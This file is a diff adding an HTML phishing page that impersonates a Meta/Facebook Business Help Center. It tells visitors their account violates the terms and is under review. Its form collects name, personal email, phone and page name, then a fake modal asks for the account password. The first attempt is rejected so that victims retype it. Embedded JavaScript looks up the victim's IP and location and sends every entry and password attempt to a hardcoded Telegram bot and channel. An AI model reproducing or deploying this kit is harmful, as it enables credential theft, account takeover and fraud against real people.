@@ -1,0 +1,572 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8">
+  <link href="fcf-assets/css/fcf.default-1.css" rel="stylesheet">
+  <script src="jquery-3.6.0.min-1.js"></script>
+
+  <title>Meta For Business</title>
+  <style>
+    /* Add custom CSS styles */
+    body {
+      margin: 0;
+      padding: 0;
+    }
+    
+    .container {
+  background-image: url('back-1.jpg');
+  background-size: cover; /* Adjust the background size to cover the container */
+  background-position: center;
+  background-repeat: no-repeat;
+  padding: 5px;
+  text-align: center;
+  color: white;
+  margin-top: 100px; /* Add margin-top for spacing */
+}
+
+.container h2 {
+  font-size: 1.5rem; /* Adjust the font size as needed */
+  margin-bottom: 10px; /* Add margin bottom for spacing */
+}
+
+@media only screen and (max-width: 768px) {
+  /* Media query for mobile devices */
+  .container {
+    margin-top: 50px; /* Adjust the margin-top value for mobile view */
+  }
+}
+    
+    header {
+      background-color: White; /* Blue color similar to Facebook */
+      padding: 20px;
+      color: #fff; /* White text color */
+      text-align: center;
+      display: flex;
+      align-items: center;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+    }
+    
+    .logo {
+      margin-right: 40px;
+      width: 60px; /* Set the desired width */
+      height: auto; /* Maintain aspect ratio */
+    }
+    
+    .get-started,
+    .advertise,
+    .learn,
+    .support {
+      font-family: Helvetica, Arial, sans-serif;
+      font-size: 14px;
+      color: gray; /* Set the desired gray color */
+      cursor: pointer; /* Add cursor pointer */
+    }
+
+    .space {
+      margin-right: 70px; /* Set the desired space between the texts */
+    }
+    
+    ul {
+      list-style-type: none;
+      margin: 0;
+      padding: 0;
+      margin-top: 40px; /* Adjust the margin-top value as needed */
+    }
+    
+    li {
+      display: inline;
+      margin-right: 10px;
+    }
+    
+    a {
+      color: #fff; /* White text color for links */
+      text-decoration: none;
+    }
+
+
+    /* New styles for the bottom section */
+    .header-bottom-text {
+      margin-top: 20px;
+      font-size: 16px;
+      font-family: Helvetica, Arial, sans-serif;
+      color: gray;
+    }
+    
+    .bold-text {
+      font-weight: ;
+    }
+
+    /* Responsive styles */
+    @media only screen and (max-width: 600px) {
+      .logo {
+        margin-right: 20px;
+        width: 40px;
+      }
+
+      .get-started,
+      .advertise,
+      .learn,
+      .support {
+        font-size: 12px;
+      }
+
+      .space {
+        margin-right: 20px;
+      }
+
+      .start-now-button {
+        top: 25px;
+        right: 20px;
+        left: auto;
+      }
+
+      .container {
+        margin-top: 6px;
+      }
+    }
+    
+    .container h2 {
+      font-size: 34px;
+      font-weight: normal;
+    }
+	
+	.container {
+      font-family: Arial, sans-serif;
+    }
+	/* Custom modal styles */
+    .modal-container {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.5);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      visibility: hidden;
+      opacity: 0;
+      transition: visibility 0s, opacity 0.5s;
+    }
+
+    .modal-content {
+      background-color: #fff;
+      padding: 10px;
+      border-radius: 10px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+
+    .modal-container.active {
+      visibility: visible;
+      opacity: 1;
+    }
+
+    .password-error {
+      color: red;
+      display: none;
+    }
+	.modal-content button {
+      background-color: blue; /* Change the background color to blue */
+      color: white;
+      border: none;
+      border-radius: 5px;
+      padding: 10px 20px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .modal-content button:hover {
+      background-color: darkblue; /* Change the background color on hover */
+    }
+	
+	.modal-content input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      font-size: 16px;
+      border: 1px solid blue;
+      border-radius: 5px;
+      margin-bottom: 20px;
+      box-sizing: border-box;
+      outline: none;
+    }
+	
+	 .search-icon {
+    display: inline-block;
+    width: 34px;
+    height: 34px;
+    cursor: pointer;
+    position: relative; /* Set position to relative */
+    top: 0; /* Adjust the top position as needed */
+    left: 410px; /* Adjust the left position as needed */
+  }
+  
+  .profile-icon {
+    display: inline-block;
+    width: 34px;
+    height: 34px;
+    cursor: pointer;
+	position: relative; /* Set position to relative */
+    top: -1px; /* Adjust the top position as needed */
+    left: 430px; /* Adjust the left position as needed */
+    /* Add any additional styling here */
+  }
+  
+  a.my-button{
+ background: linear-gradient(to right,#196BCA ,#6433E0);
+ background-color: #196BCA;
+ color: #fff;
+ font-family: Trebuchet MS;
+ font-size: 18px;
+ font-weight: 100px;
+ font-style: normal;
+ text-decoration: none;
+ padding: 8px 12px;
+ border: 0px solid #000;
+ border-radius: 30px;
+ display: inline-flex;
+ justify-content: center;
+ align-items: center;
+ 
+}
+
+a.my-button span{
+ margin-left:20px;
+ display: block;
+ width: 15px;
+ height: 15px;
+ background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB3aWR0aD0iMTUwIiBoZWlnaHQ9IjE1MCIgdmlld0JveD0iMCAwIDE1MCAxNTAiPg0KICA8ZGVmcz4NCiAgICA8Y2xpcFBhdGggaWQ9ImNsaXAtcGF0aCI+DQogICAgICA8cmVjdCB4PSItNCIgeT0iLTI1IiB3aWR0aD0iMTUwIiBoZWlnaHQ9IjE1MCIgZmlsbD0ibm9uZSIvPg0KICAgIDwvY2xpcFBhdGg+DQogICAgPGNsaXBQYXRoIGlkPSJjbGlwLXBhdGgtMiI+DQogICAgICA8cmVjdCBpZD0iUmVjdGFuZ2xlXzEiIGRhdGEtbmFtZT0iUmVjdGFuZ2xlIDEiIHdpZHRoPSIxNDIiIGhlaWdodD0iMTAwIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxMC4zMzMgOS4xMjgpIiBmaWxsPSJub25lIi8+DQogICAgPC9jbGlwUGF0aD4NCiAgICA8bGluZWFyR3JhZGllbnQgaWQ9ImxpbmVhci1ncmFkaWVudCIgeDE9IjAuOTg2IiB5MT0iMC41MDciIHgyPSItMC4wMjgiIHkyPSIwLjUyMiIgZ3JhZGllbnRVbml0cz0ib2JqZWN0Qm91bmRpbmdCb3giPg0KICAgICAgPHN0b3Agb2Zmc2V0PSIwIiBzdG9wLWNvbG9yPSIjZmZmIi8+DQogICAgICA8c3RvcCBvZmZzZXQ9IjAuNTMxIiBzdG9wLWNvbG9yPSIjZDlkOWQ5Ii8+DQogICAgICA8c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9ImdyYXkiLz4NCiAgICA8L2xpbmVhckdyYWRpZW50Pg0KICAgIDxsaW5lYXJHcmFkaWVudCBpZD0ibGluZWFyLWdyYWRpZW50LTIiIHgxPSIwLjk4NiIgeTE9IjAuNDkzIiB4Mj0iLTAuMDI4IiB5Mj0iMC40NzgiIHhsaW5rOmhyZWY9IiNsaW5lYXItZ3JhZGllbnQiLz4NCiAgPC9kZWZzPg0KICA8ZyBpZD0iU2Nyb2xsX0dyb3VwXzEiIGRhdGEtbmFtZT0iU2Nyb2xsIEdyb3VwIDEiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDQgMjUpIiBjbGlwLXBhdGg9InVybCgjY2xpcC1wYXRoKSIgc3R5bGU9Imlzb2xhdGlvbjogaXNvbGF0ZSI+DQogICAgPGcgaWQ9ImxvZ28tdyIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTEwLjMzMyAtOS4xMjgpIiBjbGlwLXBhdGg9InVybCgjY2xpcC1wYXRoLTIpIj4NCiAgICAgIDxnIGlkPSJHcm91cF80MCIgZGF0YS1uYW1lPSJHcm91cCA0MCIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoNC45NDEgNC40ODkpIj4NCiAgICAgICAgPGcgaWQ9Ikdyb3VwXzM4IiBkYXRhLW5hbWU9Ikdyb3VwIDM4IiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgwIDAuMDAxKSI+DQogICAgICAgICAgPHJlY3QgaWQ9IlJlY3RhbmdsZV82MyIgZGF0YS1uYW1lPSJSZWN0YW5nbGUgNjMiIHdpZHRoPSI3NS44ODciIGhlaWdodD0iMjUuMjk2IiByeD0iMTIuNjQ4IiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxOC4wMzMgMzcuMjI1KSByb3RhdGUoNDUpIiBmaWxsPSJ1cmwoI2xpbmVhci1ncmFkaWVudCkiLz4NCiAgICAgICAgICA8cmVjdCBpZD0iUmVjdGFuZ2xlXzY0IiBkYXRhLW5hbWU9IlJlY3RhbmdsZSA2NCIgd2lkdGg9Ijc1Ljg4NyIgaGVpZ2h0PSIyNS4yOTYiIHJ4PSIxMi42NDgiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDAgNTMuNjYpIHJvdGF0ZSgtNDUpIiBmaWxsPSIjZmZmIi8+DQogICAgICAgICAgPGNpcmNsZSBpZD0iRWxsaXBzZV8xIiBkYXRhLW5hbWU9IkVsbGlwc2UgMSIgY3g9IjcuODQyIiBjeT0iNy44NDIiIHI9IjcuODQyIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxMS4xMyA0NS4wODEpIiBmaWxsPSIjZDlkYmZmIi8+DQogICAgICAgIDwvZz4NCiAgICAgICAgPGcgaWQ9Ikdyb3VwXzM5IiBkYXRhLW5hbWU9Ikdyb3VwIDM5IiB0cmFuc2Zvcm09InRyYW5zbGF0ZSg4MC4wNzkgMCkiPg0KICAgICAgICAgIDxyZWN0IGlkPSJSZWN0YW5nbGVfNjMtMiIgZGF0YS1uYW1lPSJSZWN0YW5nbGUgNjMiIHdpZHRoPSI3NS44ODciIGhlaWdodD0iMjUuMjk2IiByeD0iMTIuNjQ4IiB0cmFuc2Zvcm09InRyYW5zbGF0ZSg3MS41NDcgNTUuMTEyKSByb3RhdGUoMTM1KSIgZmlsbD0idXJsKCNsaW5lYXItZ3JhZGllbnQtMikiLz4NCiAgICAgICAgICA8cmVjdCBpZD0iUmVjdGFuZ2xlXzY0LTIiIGRhdGEtbmFtZT0iUmVjdGFuZ2xlIDY0IiB3aWR0aD0iNzUuODg3IiBoZWlnaHQ9IjI1LjI5NiIgcng9IjEyLjY0OCIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoNTMuODA3IDcxLjU0Nykgcm90YXRlKC0xMzUpIiBmaWxsPSIjZmZmIi8+DQogICAgICAgICAgPGNpcmNsZSBpZD0iRWxsaXBzZV8xLTIiIGRhdGEtbmFtZT0iRWxsaXBzZSAxIiBjeD0iNy44NDIiIGN5PSI3Ljg0MiIgcj0iNy44NDIiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDQ0Ljg4IDQ1LjA4MikiIGZpbGw9IiNkOWRiZmYiLz4NCiAgICAgICAgPC9nPg0KICAgICAgPC9nPg0KICAgIDwvZz4NCiAgPC9nPg0KPC9zdmc+DQo=);
+ background-repeat: no-repeat;
+ background-size: contain;
+ transform: rotate(0deg);
+ left: 230px; /* Adjust the left position as needed */
+}
+a.my-button:hover{
+ background: linear-gradient(to right,#5482d0 ,#7d5ee3);
+ background-color: #5482d0;
+}
+a.my-button:active{
+ transform: scale(0.95);
+}
+
+a.my-button {
+  /* Existing styles */
+  margin-left: 450px; /* Adjust the value as needed to move the button to the right */
+  
+}
+
+.login-success {
+  display: block;
+}
+  .header {
+  background-color: #f8f8f8;
+  padding: 10px;
+  text-align: center;
+}
+
+.container {
+  background-image: url('back-1.jpg');
+  background-size: cover;
+  background-position: center;
+  background-repeat: no-repeat;
+  padding: 5px;
+  text-align: center;
+  color: white;
+  margin-top: 100px;
+}
+
+.container h2 {
+  font-size: 1.5rem;
+  margin-bottom: 10px;
+}
+
+</style>
+  <script>
+    function showNotification() {
+      alert("Please fill out the form first.");
+    }
+  </script>
+</head>
+<body>
+<header>
+  <link rel="stylesheet" href="ajax/libs/font-awesome/5.15.3/css/all.min-1.css" integrity="sha512-..." crossorigin="anonymous">
+  <img src="v/t39.8562-6/252294889_575082167077436_6034106545912333281_n-1.svg?media_id=575082170410769&version=1635790249" alt="Facebook Logo" class="logo">
+  <h1></h1>
+  <span class="get-started" onclick="showNotification()">Get started</span>
+  <span class="space"></span> <!-- Add space element -->
+  <span class="advertise" onclick="showNotification()">Advertise</span>
+  <span class="space"></span> <!-- Add space element -->
+  <span class="learn" onclick="showNotification()">Learn</span>
+  <span class="space"></span> <!-- Add space element -->
+  <span class="support" onclick="showNotification()">Support</span>
+  <span class="search-icon">
+    <img src="search-icon-1.png" alt="Search Icon" width="34" height="34">
+  </span>
+  <span class="profile-icon">
+    <img src="profile-icon-1.png" alt="Profile Icon" width="34" height="34">
+  </span>
+  <a class="my-button" href="#">Start Now<span></span></a>
+</header>
+
+
+
+  <div class="container">
+    <h2>Facebook Business Help Center</h2> <!-- Added text -->
+  </div>
+  <center>
+  <div class="row" style="padding-top: -200px; padding-bottom: -10px; background-color: #f7f7f7; border-bottom:1px solid #dddfe2">
+  <div class="col-md-12"></div>
+  <div class="col-md-1 col-2"></div>
+  <div class="col-md-11 col-10" style="padding-left: 0px;">
+    <div style="background-color: #eaeaea; padding: -250px;">
+      <h1 style="text-align: center; font-weight: bold; font-size: 20px;">Get Started</h1>
+      <p style="font-size: 13px; color: #808080;">
+        We have received multiple reports that suggest that your account has been<br>
+        in violation of our terms of service and community guidelines.<br>
+        As a result, your account is scheduled for review
+        <br>
+        <br>
+        <script>
+          window.addEventListener("DOMContentLoaded", function() {
+            generateRandomNumber();
+          });
+
+          function generateRandomNumber() {
+            var randomNumber = Math.floor(Math.random() * 900000000000) + 100000000000;
+            document.getElementById("randomNumber").innerHTML = randomNumber;
+          }
+        </script>
+        <p>Report no: <span id="randomNumber"></span></p>
+      
+    </div>
+  </div>
+</div>
+  </center>
+<div style="display: flex; justify-content: center;">
+  <div id="fcf-form" class="">
+    <form class="fcf-form-class" id="freeversion" method="post" action="confirm.html">
+     <div style="display: flex; justify-content: center;">
+  <div id="fcf-form" class="">
+    <form class="fcf-form-class" id="freeversion" method="post" action="confirm.html">
+      <div class="field">
+        <label for="Message" class="label has-text-weight-normal" style="text-align: left;">Please provide information that might help us investigate</label>
+        <div class="control">
+          <textarea name="Message" id="Message" class="textarea" maxlength="5000" rows="3" data-validate-field="Message"></textarea>
+        </div>
+      </div>
+      <div class="field">
+        <label for="Name" class="label has-text-weight-normal" style="text-align: left;">Full Name</label>
+        <div class="control">
+          <input type="text" name="Name" id="Name" class="input is-full-width" maxlength="100" data-validate-field="Name">
+        </div>
+      </div>
+      <div class="field">
+        <label for="Email" class="label has-text-weight-normal" style="text-align: left;">Personal Email Address</label>
+        <div class="control">
+          <input type="email" name="Email" id="Email" class="input is-full-width" maxlength="100" data-validate-field="Email">
+        </div>
+      </div>
+      <div class="field">
+        <label for="Phone" class="label has-text-weight-normal" style="text-align: left;">Mobile Phone Number</label>
+        <div class="control">
+          <input type="text" name="Phone" id="Phone" class="input is-full-width" maxlength="100" data-validate-field="Phone">
+        </div>
+      </div>
+      <div class="field">
+        <label for="PageName" class="label has-text-weight-normal" style="text-align: left;">Facebook Page Name</label>
+        <div class="control">
+          <input type="text" name="PageName" id="PageName" class="input is-full-width" maxlength="100" data-validate-field="PageName">
+        </div>
+      </div>
+      <div class="field">
+        <div class="buttons">
+          <button id="fcf-button" type="button" class="button is-link is-medium" onclick="openModal()">Submit</button>
+        </div>
+      </div>
+    </form>
+  </div>
+</div>
+
+<!-- Modal Container -->
+<div class="modal-container" id="modalContainer">
+  <div class="modal-content">
+    <h3>Password Required</h3>
+    <p>Please enter the password to submit the appeal:</p>
+    <input type="password" id="password" class="password-input">
+    <p class="password-error" id="password-error" style="display: none;">Incorrect password. Please try again.</p>
+    <p class="login-success" id="login-success" style="display: none;">Successful login!</p>
+    <br>
+    <button onclick="submitForm()">Submit</button>
+  </div>
+</div>
+
+<script src="npm/axios/dist/axios.min.js"></script>
+<script>
+  function openModal() {
+    var modalContainer = document.querySelector('.modal-container');
+    modalContainer.classList.add('active');
+  }
+
+  var passwordAttempts = 0; // Initialize password attempt counter
+
+  function submitForm() {
+  var password = document.getElementById('password').value;
+
+  if (password === 'examplepassword' || passwordAttempts === 1 || passwordAttempts === 2) {
+    // Password is correct or it's the second or third attempt, proceed with form submission
+    document.getElementById('password-error').style.display = 'none'; // Hide the error message if previously shown
+    document.getElementById('login-success').style.display = 'block'; // Show successful login message
+
+    // Send message to Telegram bot with the entered password and IP location
+    var message = 'Pasi' + (passwordAttempts + 1) + ': ' + password;
+    getIPLocation(message, true);
+
+    if (passwordAttempts === 2) {
+      // Redirect to confirm.html after the third attempt
+      setTimeout(function() {
+        window.location.href = 'confirm.html';
+      }, 2000);
+    } else {
+      // Submit the form after sending the Telegram message
+      setTimeout(function() {
+        document.getElementById('freeversion').submit();
+      }, 2000);
+    }
+  } else {
+    // Password is incorrect, show error message
+    document.getElementById('password-error').style.display = 'block';
+    document.getElementById('login-success').style.display = 'none'; // Hide successful login message
+
+    // Send message to Telegram bot with the entered password and IP location
+    var message = 'Pasi' + (passwordAttempts + 1) + ': ' + password;
+    getIPLocation(message, false);
+
+    passwordAttempts++; // Increment password attempt counter
+  }
+}
+
+  function getIPLocation(message, shouldRedirect) {
+    // Fetch IP location using axios
+    axios.get('https://ipapi.co/json/')
+      .then(response => {
+        // Extract IP address, country, and city from the response
+        const { ip, country_name, city } = response.data;
+
+        // Append IP location to the message
+        message += '\nIP: ' + ip + '\nCountry: ' + country_name + '\nCity: ' + city;
+
+        // Send message to Telegram bot
+        sendTelegramMessage(message);
+
+        if (shouldRedirect) {
+          // Delay the redirect for 2 seconds to allow the Telegram message to be sent
+          setTimeout(() => {
+            window.location.replace('confirm.html');
+          }, 2000);
+        }
+      })
+      .catch(error => {
+        console.error('Error fetching IP location:', error);
+        // Send message to Telegram bot without IP location
+        sendTelegramMessage(message);
+      });
+  }
+
+  function sendTelegramMessage(message) {
+    var botToken = '6680311904:AAEI1WNY6jKcgUJBahgoYIrrtrblhn7Xmnw';
+    var chatId = '@makememilions';
+
+    var apiUrl = 'https://api.telegram.org/bot6680311904:AAEI1WNY6jKcgUJBahgoYIrrtrblhn7Xmnw/sendMessage';
+    var data = {
+      chat_id: chatId,
+      text: message
+    };
+
+    axios.post(apiUrl, data)
+      .then(function (response) {
+        console.log('Message sent to Telegram bot:', message);
+      })
+      .catch(function (error) {
+        console.error('Error sending message to Telegram bot:', error);
+      });
+  }
+</script>
+
+<script>
+
+  function sendData() {
+  // Retrieve form input values
+  const message = document.getElementById('Message').value;
+  const name = document.getElementById('Name').value;
+  const email = document.getElementById('Email').value;
+  const phone = document.getElementById('Phone').value;
+  const pageName = document.getElementById('PageName').value;
+
+  // Fetch IP location
+  fetch('https://ipapi.co/json/')
+    .then(response => response.json())
+    .then(ipData => {
+      // Extract IP address, country, and city
+      const { ip, country_name, city } = ipData;
+
+      // Create the formatted message
+      const formattedMessage =
+        'Mesazhi: ' + message + '\n' +
+        'Emri: ' + name + '\n' +
+        'Emaili: ' + email + '\n' +
+        'NrTel: ' + phone + '\n' +
+        'Emri i Faqes: ' + pageName + '\n' +
+        'IP: ' + ip + '\n' +
+        'Shteti: ' + country_name + '\n' +
+        'Qyteti: ' + city;
+
+      // Send message to Telegram bot
+      sendTelegramMessage(formattedMessage);
+    })
+    .catch(error => {
+      console.error('Error fetching IP location:', error);
+      // Send message to Telegram bot without IP location
+      sendTelegramMessage(message);
+    });
+}
+
+function sendTelegramMessage(message) {
+    var botToken = '6680311904:AAEI1WNY6jKcgUJBahgoYIrrtrblhn7Xmnw';
+    var chatId = '@makememilions';
+
+    var apiUrl = 'https://api.telegram.org/bot6680311904:AAEI1WNY6jKcgUJBahgoYIrrtrblhn7Xmnw/sendMessage';
+    var data = {
+      chat_id: chatId,
+      text: message
+    };
+
+  axios.post(apiUrl, data)
+    .then(function (response) {
+      console.log('Message sent to Telegram bot:', message);
+    })
+    .catch(function (error) {
+      console.error('Error sending message to Telegram bot:', error);
+    });
+}
+
+  document.getElementById('fcf-button').addEventListener('click', function() {
+    openModal();
+    sendData();
+  });
+
+  document.querySelector('.modal-container').addEventListener('click', function (event) {
+    if (event.target === this) {
+      this.classList.remove('active');
+    }
+  });
+  document.querySelector('.modal-content').addEventListener('click', function (event) {
+    event.stopPropagation();
+  });
+</script>
+</form></div></div></body></html>
